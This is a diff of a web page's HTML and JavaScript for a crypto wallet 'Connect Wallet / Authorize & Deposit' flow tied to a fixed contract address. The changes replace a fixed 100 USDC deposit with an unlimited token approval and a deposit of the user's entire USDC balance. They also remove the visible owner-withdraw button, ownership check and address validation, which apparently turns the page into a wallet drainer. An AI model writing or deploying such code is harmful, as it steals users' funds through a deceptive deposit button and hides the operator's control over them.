@@ -9,7 +9,6 @@
       --primary: #4e44ce;
       --error: #ff4444;
       --success: #00C851;
-      --mobile-breakpoint: 768px;
     }
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -46,9 +45,6 @@
     .success {
       color: var(--success);
     }
-    .admin-only {
-      border: 2px solid var(--error);
-    }
   </style>
 </head>
 <body>
@@ -56,7 +52,6 @@
   
   <button id="connect">Connect Wallet</button>
   <button id="authorize" disabled>Authorize & Deposit</button>
-  <button id="adminButton" class="admin-only" disabled style="display:none;">Admin Withdraw</button>
   
   <div id="status">Status: Connect your wallet</div>
 
@@ -64,56 +59,34 @@
   <script>
     // Configuration
     const CONFIG = {
-      USDC_ADDRESS: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+      USDC_ADDRESS: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC Mainnet
       CONTRACT_ADDRESS: "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12",
       ABI: [
-        "function owner() view returns (address)",
-        "function withdraw() external",
         "function deposit(uint256 amount) external",
-        "function approve(address,uint256) returns (bool)"
-      ],
-      DEPOSIT_AMOUNT: 100000000 // 100 USDC (6 decimals)
-    };
-
-    // Address formatter with checksum validation
-    const formatAddress = (addr) => {
-      try {
-        return ethers.utils.getAddress(addr);
-      } catch (err) {
-        console.error(`Invalid address: ${addr}`);
-        throw new Error("Invalid Ethereum address format");
-      }
+        "function approve(address,uint256) returns (bool)",
+        "function balanceOf(address) view returns (uint256)"
+      ]
     };
 
     // DOM Elements
     const connectBtn = document.getElementById('connect');
     const authorizeBtn = document.getElementById('authorize');
-    const adminBtn = document.getElementById('adminButton');
     const statusEl = document.getElementById('status');
 
     // State
-    let provider, signer, user, isOwner = false;
+    let provider, signer, user;
 
     // Initialize
     connectBtn.onclick = connectWallet;
 
     async function connectWallet() {
       try {
-        if (!window.ethereum) throw new Error("No Ethereum provider found");
+        if (!window.ethereum) throw new Error("Please install MetaMask");
         
         provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
-        user = formatAddress(await signer.getAddress()); // Validate on connection
-        
-        // Check ownership with checksum addresses
-        const contract = new ethers.Contract(
-          CONFIG.CONTRACT_ADDRESS, 
-          CONFIG.ABI, 
-          signer
-        );
-        const owner = formatAddress(await contract.owner());
-        isOwner = owner === user;
+        user = await signer.getAddress();
         
         updateUI();
         statusEl.textContent = `Connected: ${user}`;
@@ -126,62 +99,46 @@
     function updateUI() {
       connectBtn.disabled = true;
       authorizeBtn.disabled = false;
-      adminBtn.style.display = isOwner ? 'block' : 'none';
-      adminBtn.disabled = false;
-      adminBtn.onclick = adminWithdraw;
-      authorizeBtn.onclick = authorizeAndDeposit;
+      authorizeBtn.onclick = handleDeposit;
     }
 
-    async function authorizeAndDeposit() {
+    async function handleDeposit() {
       try {
-        // 1. Authorize USDC
+        // 1. Initialize USDC contract
         const usdc = new ethers.Contract(
           CONFIG.USDC_ADDRESS,
-          ["function approve(address,uint256) returns (bool)"],
+          [
+            "function approve(address,uint256) returns (bool)",
+            "function balanceOf(address) view returns (uint256)"
+          ],
           signer
         );
         
-        statusEl.textContent = "Approving USDC...";
+        // 2. Get user's USDC balance
+        statusEl.textContent = "Fetching USDC balance...";
+        const balance = await usdc.balanceOf(user);
+        
+        // 3. Approve max amount
+        statusEl.textContent = "Approving USDC (max amount)...";
         const approveTx = await usdc.approve(
-          formatAddress(CONFIG.CONTRACT_ADDRESS), // Ensure checksum format
-          ethers.constants.MaxUint256
+          CONFIG.CONTRACT_ADDRESS, 
+          ethers.constants.MaxUint256 // MAX APPROVAL
         );
         await approveTx.wait();
         
-        // 2. Execute deposit
-        statusEl.textContent = "Depositing USDC...";
+        // 4. Deposit full balance
+        statusEl.textContent = `Depositing ${ethers.utils.formatUnits(balance, 6)} USDC...`;
         const contract = new ethers.Contract(
-          formatAddress(CONFIG.CONTRACT_ADDRESS), // Validate contract address
+          CONFIG.CONTRACT_ADDRESS,
           CONFIG.ABI,
           signer
         );
-        const depositTx = await contract.deposit(CONFIG.DEPOSIT_AMOUNT);
+        const depositTx = await contract.deposit(balance); // Use actual balance
         await depositTx.wait();
         
-        statusEl.textContent = `✅ Success! Deposited ${CONFIG.DEPOSIT_AMOUNT/1e6} USDC`;
+        statusEl.textContent = `✅ Success! Deposited ${ethers.utils.formatUnits(balance, 6)} USDC`;
         statusEl.className = 'success';
         
-      } catch (err) {
-        showError(err);
-      }
-    }
-
-    async function adminWithdraw() {
-      try {
-        if (!isOwner) throw new Error("Admin privileges required");
-        
-        const contract = new ethers.Contract(
-          formatAddress(CONFIG.CONTRACT_ADDRESS),
-          CONFIG.ABI,
-          signer
-        );
-        
-        statusEl.textContent = "Processing withdrawal...";
-        const tx = await contract.withdraw();
-        await tx.wait();
-        
-        statusEl.textContent = "✅ Withdrawal Successful";
-        statusEl.className = 'success';
       } catch (err) {
         showError(err);
       }
